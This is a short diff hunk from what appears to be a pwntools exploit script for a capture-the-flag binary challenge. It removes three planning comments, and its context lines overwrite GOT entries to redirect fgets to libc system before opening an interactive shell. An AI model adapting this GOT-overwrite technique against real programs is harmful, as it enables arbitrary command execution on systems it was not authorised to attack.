@@ -657,10 +657,6 @@ print(hex(l.sym['system']))
 got_mod(e.got['gettimeofday'], e2.sym['main'], 4)
 got_mod(e.got['fgets'], l.sym['system'], 6)
 
-# gettimeofday -> main
-# setbuf -> pop r13, ret
-# time -> 0xd4f5f
-
 #gdb.attach(p, "b* main")
 p.sendlineafter(b': ', b'3')
 p.interactive()
